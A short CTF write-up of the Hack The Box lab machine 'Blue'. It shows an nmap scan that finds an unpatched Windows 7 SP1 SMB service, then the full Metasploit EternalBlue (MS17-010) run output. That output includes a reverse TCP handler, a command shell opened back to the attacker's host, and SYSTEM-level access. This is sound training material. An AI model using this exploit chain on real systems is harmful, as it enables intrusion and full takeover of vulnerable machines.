#Title: Blue
Date: 2019-10-20

This was a nice and easy one.

## Enumeration

Once again, a port scan to start off, I've been expirementing with different scans with each of these. At this point with the easier boxes it's not all too important. There's not likely anything too tricky going on. 

    $ nmap -A -p- -T4 blue
    Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-20 11:52 CDT
    Nmap scan report for blue (10.10.10.40)
    Host is up (0.040s latency).
    Not shown: 65526 closed ports
    PORT      STATE SERVICE      VERSION
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
    49152/tcp open  msrpc        Microsoft Windows RPC
    49153/tcp open  msrpc        Microsoft Windows RPC
    49154/tcp open  msrpc        Microsoft Windows RPC
    49155/tcp open  msrpc        Microsoft Windows RPC
    49156/tcp open  msrpc        Microsoft Windows RPC
    49157/tcp open  msrpc        Microsoft Windows RPC
    Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: mean: -24m05s, deviation: 34m37s, median: -4m06s
    | smb-os-discovery: 
    |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
    |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
    |   Computer name: haris-PC
    |   NetBIOS computer name: HARIS-PC\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2019-10-20T17:50:25+01:00
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2019-10-20T16:50:26
    |_  start_date: 2019-10-20T16:45:06

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 112.46 seconds

The machine is running Windows 7 SP1. Between that and the name of this box I thought EternalBlue might be something to keep in mind. This was the exploit used by __WannaCry__. 

## Thanks, Shadow Brokers

So I gave that a shot:

    msf5 exploit(windows/smb/ms17_010_eternalblue) > run

    [*] Started reverse TCP handler on 10.10.14.23:4444 
    [+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
    [*] 10.10.10.40:445 - Connecting to target for exploitation.
    [+] 10.10.10.40:445 - Connection established for exploitation.
    [+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
    [*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
    [*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
    [*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
    [*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
    [+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
    [*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
    [*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
    [*] 10.10.10.40:445 - Starting non-paged pool grooming
    [+] 10.10.10.40:445 - Sending SMBv2 buffers
    [+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
    [*] 10.10.10.40:445 - Sending final SMBv2 buffers.
    [*] 10.10.10.40:445 - Sending last fragment of exploit packet!
    [*] 10.10.10.40:445 - Receiving response from exploit packet
    [+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
    [*] 10.10.10.40:445 - Sending egg to corrupted connection.
    [*] 10.10.10.40:445 - Triggering free of corrupted buffer.
    [*] Command shell session 1 opened (10.10.14.23:4444 -> 10.10.10.40:49158) at 2019-10-20 13:35:12 -0500
    [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

    C:\Windows\system32

    c:\Users>whoami	
    whoami
    nt authority\system

I got root.

## Endnotes

Not much to say about this one other than it was a super easy one. The default payload just gave me a shell, but I exited and set the payload to a meterpreter just because - and that worked too. 




	
